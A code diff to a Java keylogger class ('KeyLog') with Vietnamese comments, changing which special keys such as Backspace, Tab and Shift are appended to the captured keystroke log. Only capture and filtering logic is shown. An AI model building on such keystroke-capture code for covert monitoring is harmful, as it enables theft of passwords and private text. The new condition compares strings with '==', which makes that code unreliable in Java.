@@ -25,7 +25,7 @@ public class KeyLog implements NativeKeyListener {
 		String key = NativeKeyEvent.getKeyText(e.getKeyCode());
 		
 		//Nếu độ dài của phím bắt được lớn hơn 1, tức là Backspace ,... thì thêm vào string keylog
-		if (key.length() > 1)
+		if (key == "Escape" || key == "Insert" || key == "Delete" || key == "App Calculator" || key == "Backspace" || key == "Num Lock" || key == "Tab" || key == "Caps Lock" || key =="Enter" || key =="Shift" || key == "Ctrl" || key == "Meta" || key == "Alt" || key == "Space" || key == "Page Up" || key == "Page Down" || key =="Up" || key == "Down" || key == "Left" || key == "Right")
 		{
 			keylog += key + " ";
 		}
@@ -40,7 +40,7 @@ public class KeyLog implements NativeKeyListener {
 		
 		
 		//Nếu là các kí tự đặt biệt, hoặc dấu cách, hoặc xuống dòng thì không nhận (vì đã nhận ở nativeKeyPressed)
-		if (e.getKeyChar()=='' | e.getKeyChar() == ' ' | e.getKeyChar() == 13 )
+		if (e.getKeyChar()=='' | e.getKeyChar() == ' ' | e.getKeyChar() == 13 || e.getKeyChar() == 9)
 		{
 			return;
 		}
